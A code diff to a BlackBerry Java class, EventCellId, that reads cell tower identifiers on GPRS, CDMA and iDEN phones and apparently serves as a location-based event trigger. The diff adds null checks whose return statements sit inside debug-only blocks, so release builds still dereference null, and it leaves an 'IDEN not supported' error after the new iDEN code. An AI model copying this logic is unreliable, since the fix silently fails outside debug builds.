@@ -12,6 +12,8 @@ import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
+import net.rim.device.api.system.IDENInfo;
+import net.rim.device.api.system.IDENInfo.IDENCellInfo;
 import net.rim.device.api.system.RadioInfo;
 import blackberry.Device;
 import blackberry.Messages;
@@ -72,6 +74,12 @@ public final class EventCellId extends Event {
         if (Device.isGPRS()) {
 
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
+            if (cellinfo == null) {
+                //#ifdef DEBUG                
+                debug.error("EventCellId: null cellinfo");
+                return;
+                //#endif
+            }
 
             mcc = Utils
                     .hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
@@ -81,17 +89,23 @@ public final class EventCellId extends Event {
             cid = cellinfo.getCellId();
             // bsic = cellinfo.getBSIC();
 
-            final StringBuffer mb = new StringBuffer();
-            mb.append(Messages.getString("t.6") + mcc); //$NON-NLS-1$
-            mb.append(Messages.getString("t.5") + mnc); //$NON-NLS-1$
-            mb.append(Messages.getString("t.4") + lac); //$NON-NLS-1$
-            mb.append(Messages.getString("t.3") + cid); //$NON-NLS-1$
             //#ifdef DEBUG
+            final StringBuffer mb = new StringBuffer();
+            mb.append(" MCC:" + mcc); //$NON-NLS-1$
+            mb.append(" MNC:" + mnc); //$NON-NLS-1$
+            mb.append(" LAC:" + lac); //$NON-NLS-1$
+            mb.append(" CID:" + cid); //$NON-NLS-1$
             debug.info(mb.toString());
             //#endif
 
         } else if (Device.isCDMA()) {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
+            if (cellinfo == null) {
+                //#ifdef DEBUG                
+                debug.error("EventCellId: null cellinfo");
+                return;
+                //#endif
+            }
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
             final int nid = cellinfo.getNID();
@@ -99,12 +113,11 @@ public final class EventCellId extends Event {
             //https://www.blackberry.com/jira/browse/JAVAAPI-641
             mcc = RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex());
 
-            final StringBuffer mb = new StringBuffer();
-            mb.append(Messages.getString("t.2") + sid); //$NON-NLS-1$
-            mb.append(Messages.getString("t.1") + nid); //$NON-NLS-1$
-            mb.append(Messages.getString("t.0") + bid); //$NON-NLS-1$
-
             //#ifdef DEBUG
+            final StringBuffer mb = new StringBuffer();
+            mb.append(" SID:" + sid); //$NON-NLS-1$
+            mb.append(" NID:" + nid); //$NON-NLS-1$
+            mb.append(" BID:" + bid); //$NON-NLS-1$
             debug.info(mb.toString());
             //#endif
 
@@ -112,6 +125,36 @@ public final class EventCellId extends Event {
             lac = nid;
             cid = bid;
         } else if (Device.isIDEN()) {
+            final IDENCellInfo cellinfo = IDENInfo.getCellInfo();
+            if (cellinfo == null) {
+                //#ifdef DEBUG                
+                debug.error("EventCellId: null cellinfo");
+                return;
+                //#endif
+            }
+            mcc = Utils.hex(RadioInfo.getMCC(RadioInfo
+                    .getCurrentNetworkIndex()));
+
+            final int ndc = cellinfo.getNDC();
+            final int said = cellinfo.getSAId();
+            final int llaid = cellinfo.getLLAId();
+            final int icid = cellinfo.getCellId();
+            
+            mnc=ndc;
+            lac=llaid;
+            cid=icid;
+            
+          //#ifdef DEBUG
+            final StringBuffer mb = new StringBuffer();
+            mb.append(" MCC:" + mcc); //$NON-NLS-1$
+            mb.append(" NDC:" + ndc); //$NON-NLS-1$
+            mb.append(" SAID:" + said); //$NON-NLS-1$
+            mb.append(" LLAID:" + llaid); //$NON-NLS-1$
+            mb.append(" CID:" + cid); //$NON-NLS-1$
+
+            debug.info(mb.toString());
+            //#endif
+            
             //#ifdef DEBUG
             debug.error("actualRun: IDEN not supported"); //$NON-NLS-1$
             //#endif
